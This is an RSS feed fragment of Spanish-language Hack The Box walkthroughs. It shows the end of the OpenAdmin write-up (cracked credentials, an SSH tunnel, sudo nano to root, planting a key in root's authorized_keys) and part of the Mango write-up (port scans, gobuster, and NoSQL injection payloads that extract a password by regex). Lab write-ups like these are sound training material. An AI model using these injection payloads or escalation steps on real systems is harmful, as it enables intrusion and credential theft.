&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;user---joanna&#34;&gt;USER - Joanna&lt;/h2&gt;
&lt;p&gt;Dentro de la carpeta &lt;code&gt;/var/www/&lt;/code&gt; donde usualmente se encuentran las paginas de apache, vemos que jimmy tiene permisos en una de las carpetas.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-52-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Cambiamos nuestra shell a SSH con el usuario Jimmy para poder enumerar los archivos dentro de la carpeta &lt;code&gt;/home&lt;/code&gt; y &lt;code&gt;/var/www&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-52-59.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la carpeta principal de Jimmy encontramos un archivo PHP - post.php el cual hace una solicitud con curl (en PHP) enviando un usuario y contraseña y obtiene el resultado de la solicitud.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-58-12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al ejecutarlo nos muestra un error:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-58-12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Pero la solicitud la hace hacia el localhost de la maquina en un puerto que no es publico.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-59-54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En /var/www/internal, vemos que en archivo index.php existe una contraseña encriptada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-55-05.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Con la ayuda de crackstation logramos obtener en texto plano la contraseña:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_19-56-03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jimmy:Revealed
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ahora que conocemos todo esto, traemos localmente el puerto 52846 utilizando SSH, visitamos la pagina y nos muestra un panel de logeo.&lt;/p&gt;
&lt;p&gt;SSH:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -L 8080:localhost:52846 jimmy@10.10.10.171
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Netstat:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-04-04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Panel:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-04-30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ingresamos las credenciales que obtuvimos en el archivo index, y nos muestra una clave privada de SSH encryptada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-05-30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos john the ripper para crackear la frase e iniciar sesion con la clave privada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-07-33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Frase:bloodninjas
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;SSH Joanna:&lt;br /&gt;
Obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-09-01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Utilizamos sudo para ver los comandos que podemos utilizar sin contraseña, vemos que nano es uno de ellos, con la ayuda de &lt;a href=&#34;https://gtfobins.github.io/gtfobins/nano/&#34;&gt;&lt;strong&gt;GTFOBbins - nano&lt;/strong&gt;&lt;/a&gt; obtenemos una shell commo root y con ello nuestra flag &lt;strong&gt;root&lt;/strong&gt;.txt.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-12-30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;BTW Podemos agregar nuestra clave publica al archivo &lt;code&gt;authorized_keys&lt;/code&gt; del usuario root e iniciar sesion con nuestra clave privada.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/openadmin/Screenshot_2020-01-08_20-15-08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/openadmin/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/openadmin/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Mango</title>
        <link>https://sckull.github.io/posts/mango/</link>
        <pubDate>Sat, 18 Apr 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 18 Apr 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/mango/</guid>
        <description>Mango es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Mango es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Mango&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Linux&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.162&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/13531&#34;&gt;MrR3boot&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y servicios con masscan y nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/mango# masscan -p1-65535,U:1-65535 10.10.10.162 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-12-31 00:09:30 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 80/tcp on 10.10.10.162                                    
Discovered open port 22/tcp on 10.10.10.162                                    

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Dec 30 17:45:13 2019 as: nmap -p- --min-rate 1000 -o nmap_scan 10.10.10.162&lt;/span&gt;
Warning: 10.10.10.162 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.162
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.34s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65531&lt;/span&gt; closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
443/tcp   open     https
45463/tcp filtered unknown

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Dec 30 17:46:57 2019 -- 1 IP address (1 host up) scanned in 103.79 seconds&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Mon Dec 30 18:09:24 2019 as: nmap -sV -sC -p22,80,443,45436 -o nmap_scan_sc 10.10.10.162&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.162
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE  SERVICE  VERSION
22/tcp    open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open   http     Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
443/tcp   open   ssl/http Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; Bad Request
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;staging-order.mango.htb/organizationName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Mango Prv Ltd./stateOrProvinceName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;None/countryName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;IN
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2019-09-27T14:21:19
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2020-09-26T14:21:19
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
45436/tcp closed unknown
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Mon Dec 30 18:09:56 2019 -- 1 IP address (1 host up) scanned in 32.05 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Al visitar el puerto 80 nos muestra que no tenemos permisos para ver el contenido.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-02_22-36-51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster---http&#34;&gt;GOBUSTER - HTTP&lt;/h3&gt;
&lt;p&gt;Busqueda de directorios y archivos con gobuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/mango# gobuster dir -u http://10.10.10.162/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -q -x php,html,txt
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;https&#34;&gt;HTTPS&lt;/h2&gt;
&lt;p&gt;En el puerto 443, nos muestra una pagina tipo buscador.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-02_22-37-57.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster---https&#34;&gt;GOBUSTER - HTTPS&lt;/h3&gt;
&lt;p&gt;Busqueda de directorios y archivos con gobuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/mango# gobuster dir -u https://10.10.10.162/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;35&lt;/span&gt; -q -x php,html,txt -k
/analytics.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;analyticsphp&#34;&gt;/analytics.php&lt;/h4&gt;
&lt;p&gt;Encontramos una pagina con una funcionalidad de tabla de &amp;lsquo;excel&amp;rsquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-02_22-52-17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;sslscan&#34;&gt;SSLSCAN&lt;/h3&gt;
&lt;p&gt;Utilizamos sslscan para verificar el certificado de la pagina, encontramos un dominio el cual agregamos a &lt;strong&gt;/etc/hosts&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-02_22-55-17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Visitamos la pagina del dominio nuevo (https) pero nos muestra la misma pagina que la ip en https, pero no muestra lo mismo en http.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-02_22-56-58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuevamente ejecutamos gobuster pero no encontramos nada interesante en los directorios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/mango# gobuster dir -u http://staging-order.mango.htb/ -w /usr/share/wordlists/dirb/common.txt -q -x txt,html,php -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
/home.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/vendor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;user---mongodb-nosql&#34;&gt;USER - MongoDB NoSQL&lt;/h2&gt;
&lt;p&gt;Capturamos los datos que se envian al iniciar sesion en el panel intentando encontrar una vulnerabilidad del tipo sql injection, pero ninguno de los parametros era vulnerable. Intentamos con NoSQL Injection dentro de burpsuite:&lt;/p&gt;
&lt;p&gt;Parametros:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username[$ne]=sckull&amp;amp;password[$ne]=sckull&amp;amp;login=login
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-03_14-37-05.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;inyeccion-nosql---burpsuite&#34;&gt;Inyeccion NoSQL - Burpsuite&lt;/h3&gt;
&lt;p&gt;Utilizamos burpsuite para obtener la contraseña y longitud de ella del usuario mango (asumiendo que mango es un usuario), para conocer la longitud de la contraseña utilizamos el payload, reemplazando el numero 0 por un numero mayor hasta que el resultado de la solicitud sea 200, en el caso del usuario mango la longitud de la contraseña puede ser &amp;gt;= 16 caracteres:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;mango&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;password&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$regex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]=&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;16&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;login&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;login
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-03_15-00-08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizando el siguiente payload donde el 0 es reemplazado por otro hasta que la respuesta de nuestra solicitud sea Codigo 302 que significa que la expresion regular que le estamos pasando esta haciendo match con la contraseña:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=mango&amp;amp;password[$regex]=^0&amp;amp;login=login
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Vemos que el inicio de la contraseña es &lt;strong&gt;h&lt;/strong&gt;:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/mango/Screenshot_2020-01-03_14-52-25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Modificamos nuevamente nuestro parametro en password:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=mango&amp;amp;password[$regex]=^h§0§&amp;amp;login=login
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Haciendo el mismo procedimiento cada vez que encontremos una solicitud 302, hasta obtener la contraseña completa:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mango:h3mXK8RhU~f{]f5H
